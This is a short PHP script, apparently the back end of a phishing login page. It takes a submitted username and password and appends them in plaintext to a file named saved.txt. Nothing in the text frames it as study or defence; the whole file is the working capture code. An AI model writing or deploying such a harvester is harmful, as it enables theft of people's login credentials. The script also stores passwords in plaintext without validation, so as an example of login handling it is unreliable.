<?php
if(isset($_POST['submit'])){
$Name = "Username:".$_POST['username']."
";
$Pass = "Password:".$_POST['password']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);
}
?>